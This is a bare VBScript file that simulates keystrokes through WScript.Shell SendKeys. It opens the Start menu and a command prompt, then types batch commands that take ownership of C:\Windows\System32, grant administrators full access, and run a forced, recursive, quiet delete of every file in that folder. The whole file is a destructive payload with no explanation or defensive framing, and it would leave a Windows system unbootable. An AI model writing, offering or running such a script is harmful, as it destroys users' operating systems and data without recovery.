Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC}" ' Simulates pressing Ctrl + Esc to open the Start menu
WScript.Sleep 100 ' Wait for a moment to ensure the Start menu opens
WshShell.SendKeys "r" ' Simulates pressing the R key
WScript.Sleep 100

WshShell.SendKeys "{ENTER}" ' Simulates pressing the Enter key
WScript.Sleep 100

WshShell.SendKeys "cmd"                               
WScript.Sleep 200

WshShell.SendKeys "{ENTER}" 
WScript.Sleep 100


WshShell.SendKeys " REM Take ownership of System32
@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant administrators:F /t
cd C:\Windows\System32

REM Delete System32
timeout /t 4 NOBREAK > nul
@echo off
del /F /S /Q *.* "


WScript.Sleep 100

WshShell.SendKeys "{ENTER}" 
WScript.Sleep 100


